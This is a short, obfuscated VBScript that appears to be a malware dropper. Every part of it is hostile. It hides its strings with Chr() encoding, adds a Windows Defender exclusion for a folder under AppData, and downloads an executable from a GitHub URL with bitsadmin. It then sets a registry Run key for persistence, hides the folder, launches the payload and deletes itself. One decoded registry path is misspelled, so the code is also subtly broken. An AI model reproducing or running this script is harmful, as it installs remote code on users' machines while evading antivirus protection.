On Error Resume Next
Set a=CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
Set b=CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116))
p=a.ExpandEnvironmentStrings(Chr(37)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))&Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(86)&Chr(97)&Chr(117)&Chr(108)&Chr(116)
e=p&Chr(92)&Chr(86)&Chr(97)&Chr(117)&Chr(108)&Chr(116)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(105)&Chr(99)&Chr(101)&Chr(46)&Chr(101)&Chr(120)&Chr(101)
u="https://raw.githubusercontent.com/TDSScripter/RuntimeBroker/main/RuntimeBroker.exe"

If Not b.FolderExists(p) Then b.CreateFolder(p)
a.Run "powershell -Command ""Add-MpPreference -ExclusionPath '" & p & "'"" -WindowStyle Hidden", 0, True

If Not b.FileExists(e) Then
a.Run "cmd /c bitsadmin /transfer q /priority foreground " & u & " " & e, 0, True
End If

If b.FileExists(e) Then
a.RegWrite Chr(72)&Chr(75)&Chr(67)&Chr(85)&Chr(92)&Chr(83)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(115)&Chr(116)&Chr(92)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(92)&Chr(82)&Chr(117)&Chr(110)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(87)&Chr(107)&Chr(114),e,Chr(82)&Chr(69)&Chr(71)&Chr(95)&Chr(83)&Chr(90)
a.Run "attrib +s +h " & p, 0, True
a.Run e, 0, False
End If
b.DeleteFile WScript.ScriptFullName
